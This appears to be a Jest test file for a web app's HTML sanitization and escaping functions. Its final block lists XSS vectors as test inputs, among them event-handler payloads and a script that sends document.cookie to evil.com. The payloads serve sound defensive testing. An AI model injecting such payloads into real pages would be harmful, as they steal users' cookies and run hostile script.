import DOMPurify from 'isomorphic-dompurify'
import { sanitizeHTML, sanitizeInput, escapeHtml } from '@/lib/sanitization'

describe('Sanitization Functions', () => {
  describe('sanitizeHTML', () => {
    it('should remove dangerous scripts', () => {
      const dangerous = '<p>Hello<script>alert("XSS")</script>World</p>'
      const result = sanitizeHTML(dangerous)
      expect(result).toBe('<p>HelloWorld</p>')
    })

    it('should remove event handlers', () => {
      const dangerous = '<button onclick="alert(\'XSS\')">Click me</button>'
      const result = sanitizeHTML(dangerous)
      expect(result).toBe('<button>Click me</button>')
    })

    it('should allow safe HTML tags', () => {
      const safe = '<p>This is <strong>bold</strong> and <em>italic</em></p>'
      const result = sanitizeHTML(safe)
      expect(result).toBe(safe)
    })

    it('should remove javascript: URLs', () => {
      const dangerous = '<a href="javascript:alert(\'XSS\')">Click</a>'
      const result = sanitizeHTML(dangerous)
      expect(result).toBe('<a>Click</a>')
    })

    it('should handle empty input', () => {
      expect(sanitizeHTML('')).toBe('')
      expect(sanitizeHTML(null as any)).toBe('')
      expect(sanitizeHTML(undefined as any)).toBe('')
    })
  })

  describe('sanitizeInput', () => {
    it('should trim whitespace', () => {
      expect(sanitizeInput('  hello world  ')).toBe('hello world')
    })

    it('should remove HTML tags', () => {
      expect(sanitizeInput('<p>Hello</p>')).toBe('Hello')
    })

    it('should handle special characters', () => {
      expect(sanitizeInput('Hello & <World>')).toBe('Hello &amp; &lt;World&gt;')
    })

    it('should respect maxLength parameter', () => {
      const longText = 'a'.repeat(100)
      expect(sanitizeInput(longText, 50)).toHaveLength(50)
    })

    it('should handle empty input', () => {
      expect(sanitizeInput('')).toBe('')
      expect(sanitizeInput(null as any)).toBe('')
      expect(sanitizeInput(undefined as any)).toBe('')
    })
  })

  describe('escapeHtml', () => {
    it('should escape HTML special characters', () => {
      expect(escapeHtml('<div>Test & "quotes"</div>')).toBe(
        '&lt;div&gt;Test &amp; &quot;quotes&quot;&lt;/div&gt;'
      )
    })

    it('should escape single quotes', () => {
      expect(escapeHtml("It's a test")).toBe("It&#x27;s a test")
    })

    it('should handle already escaped content', () => {
      expect(escapeHtml('&lt;div&gt;')).toBe('&amp;lt;div&amp;gt;')
    })

    it('should handle empty input', () => {
      expect(escapeHtml('')).toBe('')
    })
  })

  describe('XSS Prevention Tests', () => {
    const xssVectors = [
      '<img src=x onerror="alert(1)">',
      '<svg onload="alert(1)">',
      '<iframe src="javascript:alert(1)">',
      '<input onfocus="alert(1)" autofocus>',
      '<select onfocus="alert(1)" autofocus>',
      '<textarea onfocus="alert(1)" autofocus>',
      '<keygen onfocus="alert(1)" autofocus>',
      '<video><source onerror="alert(1)">',
      '<audio><source onerror="alert(1)">',
      '<details open ontoggle="alert(1)">',
      '<marquee onstart="alert(1)">',
      '<meter onmouseover="alert(1)"//9>',
      '"><script>alert(String.fromCharCode(88,83,83))</script>',
      '<script>alert(document.cookie)</script>',
      '<script>fetch("https://evil.com?c="+document.cookie)</script>',
    ]

    xssVectors.forEach((vector) => {
      it(`should prevent XSS: ${vector.substring(0, 30)}...`, () => {
        const sanitized = sanitizeHTML(vector)
        expect(sanitized).not.toContain('alert')
        expect(sanitized).not.toContain('script')
        expect(sanitized).not.toContain('onerror')
        expect(sanitized).not.toContain('onload')
        expect(sanitized).not.toContain('onfocus')
        expect(sanitized).not.toContain('javascript:')
      })
    })
  })
})